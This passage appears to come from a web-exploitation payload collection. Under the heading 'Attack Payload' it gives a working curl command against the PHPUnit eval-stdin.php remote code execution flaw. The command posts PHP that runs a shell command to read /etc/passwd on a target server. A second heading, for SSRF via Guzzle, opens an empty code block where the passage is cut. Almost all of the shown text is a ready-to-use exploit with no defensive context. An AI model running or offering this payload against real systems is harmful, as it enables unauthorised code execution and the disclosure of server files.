**Attack Payload** (PHPUnit eval-stdin.php exploitation):
```bash
curl -X POST "http://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php system("cat /etc/passwd"); ?>'
```

**Attack Payload** (SSRF via Guzzle):
```text
